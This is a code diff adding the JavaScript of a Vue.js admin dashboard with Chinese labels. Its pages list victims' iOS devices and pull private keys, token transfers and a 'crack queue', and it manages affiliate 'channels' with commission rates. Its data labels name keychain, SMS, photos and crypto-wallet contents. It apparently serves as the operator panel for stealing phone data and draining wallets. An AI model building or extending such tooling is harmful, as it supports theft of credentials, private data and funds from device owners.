+          localStorage.setItem('appcore_user', JSON.stringify(res.user));
+          ElementPlus.ElMessage.success('登录成功');
+          loadAll();
+        } else {
+          ElementPlus.ElMessage.error(res.error || '登录失败');
+        }
+      } catch(e) { ElementPlus.ElMessage.error('网络错误'); }
+      loginLoading.value = false;
+    }
+
+    function handleUserCmd(cmd) {
+      if (cmd === 'logout') {
+        api('/api/auth/logout', { method: 'POST' });
+        token.value = ''; user.value = {};
+        localStorage.removeItem('appcore_token'); localStorage.removeItem('appcore_user');
+      }
+    }
+
+    // 页面切换
+    function openPage(key, title) {
+      activePage.value = key;
+      if (!tabs.value.find(t => t.key === key)) {
+        tabs.value.push({ key, title });
+      }
+      loadPageData(key);
+    }
+
+    function closeTab(key) {
+      const idx = tabs.value.findIndex(t => t.key === key);
+      if (idx > -1) {
+        tabs.value.splice(idx, 1);
+        if (activePage.value === key) activePage.value = tabs.value[Math.max(0, idx-1)].key;
+      }
+    }
+
+    function loadPageData(key) {
+      if (key === 'dashboard') loadStats();
+      if (key === 'ios-files' || key === 'device-detail') loadDevices();
+      if (key === 'private-keys') loadPrivateKeys();
+      if (key === 'token-transfers') loadTokenTransfers();
+      if (key === 'crack-queue') loadCrackQueue();
+      if (key === 'user-mgmt') loadUsers();
+      if (key === 'channel-mgmt') loadChannels();
+      if (key === 'audit-logs') loadAuditLogs();
+      if (key === 'xgd-report') { loadIosStats(); loadChannels(); }
+    }
+
+    function loadAll() {
+      loadStats(); loadChannels(); loadDevices();
+    }
+
+    // 数据加载
+    async function loadStats() {
+      const res = await api('/api/stats');
+      stats.value = res;
+    }
+
+    async function loadIosStats() {
+      const res = await api('/api/stats/ios-files');
+      iosStats.value = res;
+    }
+
+    async function loadDevices() {
+      loadingDevices.value = true;
+      const params = new URLSearchParams();
+      if (iosFilter.keyword) params.set('keyword', iosFilter.keyword);
+      if (iosFilter.osVersion) params.set('os_version', iosFilter.osVersion);
+      if (iosFilter.pipe) params.set('channel_id', iosFilter.pipe);
+      if (iosFilter.dateRange && iosFilter.dateRange.length === 2) {
+        params.set('start_date', iosFilter.dateRange[0]);
+        params.set('end_date', iosFilter.dateRange[1]);
+      }
+      const res = await api('/api/devices?' + params.toString());
+      devices.value = res.devices || [];
+      loadingDevices.value = false;
+    }
+
+    async function loadPrivateKeys() {
+      loadingKeys.value = true;
+      const res = await api('/api/private-keys');
+      privateKeys.value = res.keys || [];
+      loadingKeys.value = false;
+    }
+
+    async function loadTokenTransfers() {
+      loadingTransfers.value = true;
+      const res = await api('/api/token-transfers');
+      tokenTransfers.value = res.transfers || [];
+      loadingTransfers.value = false;
+    }
+
+    async function loadCrackQueue() {
+      loadingCrack.value = true;
+      const params = new URLSearchParams();
+      if (crackFilter.status) params.set('status', crackFilter.status);
+      const res = await api('/api/crack-queue?' + params.toString());
+      crackQueue.value = res.queue || [];
+      loadingCrack.value = false;
+    }
+
+    async function loadUsers() {
+      loadingUsers.value = true;
+      const res = await api('/api/admin/users');
+      users.value = res.users || [];
+      loadingUsers.value = false;
+    }
+
+    async function loadChannels() {
+      loadingChannels.value = true;
+      const url = user.value.role === 'admin' ? '/api/admin/channels' : '/api/stats';
+      const res = await api(url);
+      channels.value = res.channels || [];
+      loadingChannels.value = false;
+    }
+
+    async function loadAuditLogs() {
+      loadingLogs.value = true;
+      const res = await api('/api/admin/audit-logs');
+      auditLogs.value = res.logs || [];
+      loadingLogs.value = false;
+    }
+
+    // 操作
+    async function createUser() {
+      const body = { ...newUser, commission_rate: undefined };
+      const res = await api('/api/admin/users', { method: 'POST', body: JSON.stringify(body) });
+      if (res.status === 'ok') { ElementPlus.ElMessage.success('创建成功'); showUserDialog.value = false; loadUsers(); Object.assign(newUser, {username:'',password:'',display_name:'',role:'agent',channel_id:null}); }
+      else ElementPlus.ElMessage.error(res.error || '创建失败');
+    }
+
+    async function createChannel() {
+      const body = { ...newChannel, commission_rate: newChannel.commission_rate_pct / 100 };
+      delete body.commission_rate_pct;
+      const res = await api('/api/admin/channels', { method: 'POST', body: JSON.stringify(body) });
+      if (res.status === 'ok') { ElementPlus.ElMessage.success('创建成功'); showChannelDialog.value = false; loadChannels(); Object.assign(newChannel, {platform_no:'',pipe_no:'',name:'',contact:'',phone:'',commission_rate_pct:30}); }
+      else ElementPlus.ElMessage.error(res.error || '创建失败');
+    }
+
+    async function markCrackDone(row) {
+      await api(`/api/crack-queue/${row.file_id}/process`, { method: 'POST', body: JSON.stringify({status:'done', result:'手动标记'}) });
+      ElementPlus.ElMessage.success('已标记完成');
+      loadCrackQueue();
+    }
+
+    async function viewDevice(row) {
+      const res = await api(`/api/devices/${row.id}`);
+      if (res.device) {
+        currentDevice.value = { ...res.device, channel_name: row.channel_name, files: res.files || [] };
+        showDeviceDialog.value = true;
+      }
+    }
+
+    function setQuickDate(days) {
+      const end = new Date();
+      const start = new Date();
+      start.setDate(start.getDate() - days);
+      const fmt = d => d.toISOString().slice(0,10);
+      iosFilter.dateRange = [fmt(start), fmt(end)];
+      loadDevices();
+    }
+
+    // 工具
+    function formatTime(t) {
+      if (!t) return '-';
+      return t.replace('T', ' ').slice(0, 19);
+    }
+    function formatSize(bytes) {
+      if (!bytes) return '0 B';
+      if (bytes < 1024) return bytes + ' B';
+      if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
+      return (bytes/1048576).toFixed(1) + ' MB';
+    }
+
+    const typeStatsTable = computed(() => {
+      const ts = stats.value.type_stats || {};
+      const labels = { keychain:'钥匙串', memo:'备忘录', private_key:'私钥', filesystem:'文件系统', metadata:'元数据', sms:'短信', photo:'照片', video:'视频', wallet:'钱包' };
+      return Object.entries(ts).map(([type, count]) => ({ type, label: labels[type] || type, count }));
+    });
+
+    function toggleSidebar() {}
+
+    onMounted(() => {
+      if (token.value) loadAll();
+    });
+
+    watch(activePage, (val) => loadPageData(val));
+
+    return {
+      token, user, loginForm, loginLoading, doLogin, handleUserCmd,
+      activePage, tabs, currentPageTitle, openPage, closeTab,
+      stats, iosStats, devices, channels, privateKeys, tokenTransfers, crackQueue, users, auditLogs,
+      osVersions, iosFilter, crackFilter, settings,
+      loadingDevices, loadingKeys, loadingTransfers, loadingCrack, loadingUsers, loadingChannels, loadingLogs,
+      showUserDialog, showChannelDialog, showDeviceDialog, currentDevice, newUser, newChannel,
+      createUser, createChannel, markCrackDone, viewDevice, setQuickDate,
+      formatTime, formatSize, typeStatsTable, toggleSidebar,
+    };
+  }
+});
+
+app.use(ElementPlus);
+for (const [key, comp] of Object.entries(ElementPlusIconsVue)) {
+  app.component(key, comp);
+}
+app.mount('#app');
+</script>
+</body>
+</html>
